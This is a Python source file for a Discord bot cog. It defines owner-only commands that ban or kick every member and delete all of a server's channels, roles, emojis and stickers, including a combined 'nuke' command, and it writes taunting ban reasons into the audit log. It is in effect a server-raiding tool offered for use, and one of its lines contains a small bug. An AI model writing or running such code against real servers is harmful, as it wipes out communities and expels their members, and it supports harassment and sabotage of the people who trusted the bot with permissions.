from discord.ext import commands

class owner(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
    
    @commands.command()
    @commands.is_owner()
    async def say(self, ctx: commands.Context, content:str):
        await ctx.send(f"{content}")
        
    @commands.command()
    @commands.is_owner()
    async def banall(self, ctx: commands.Context):
        for m in ctx.guild.members:
            try: await m.ban(reason=f'get fucked by {ctx.author}')
            except: continue
    
    @commands.command()        
    @commands.is_owner()
    async def kickall(self, ctx: commands.Context):
        for m in ctx.guild.members:
            try: await m.kick(reason=f'get fucked by {ctx.author}')
            except: continue
    
    @commands.command()        
    @commands.is_owner()
    async def deletechannels(self, ctx: commands.Context):
        for c in ctx.guild.channels:
            try: await c.delete(reason=f'get fucked by {ctx.author}')
            except: continue
    
    @commands.command()
    @commands.is_owner()
    async def deleteroles(self, ctx: commands.Context):
        for r in ctx.guild.roles:
            try: await r.delete(reason=f'get fucked by {ctx.author}')
            except: continue
            
    @commands.command()
    @commands.is_owner()
    async def deleteemojis(self, ctx: commands.Context):
        for e in ctx.guild.emojis:
            try: await e.delete(reason=f'get fucked by {ctx.author}')
            except: continue
            
    @commands.command()
    @commands.is_owner()
    async def deletestickers(self, ctx: commands.Context):
        for s in ctx.guild.stickers:
            try: await s.delete(reason=f'get fucked by {ctx.author}')
            except: continue
            
    @commands.command()
    @commands.is_owner()
    async def nuke(self, ctx: commands.Context):
        
        for m in ctx.guild.members:
            try: await m.ban()
            except: continue
            
        for c in ctx.guild.channels:
            try: await c.delete()
            except: continue
            
        for r in ctx.guild.roles:
            try: await r.delete()
            except: continue
            
        for e in ctx.guild.emojis:
            try: await e.delete()
            except: continue
            
        for s in ctx.guild.stickers():
            try: await s.delete()
            except: continue
        
async def setup(bot):
    await bot.add_cog(owner(bot))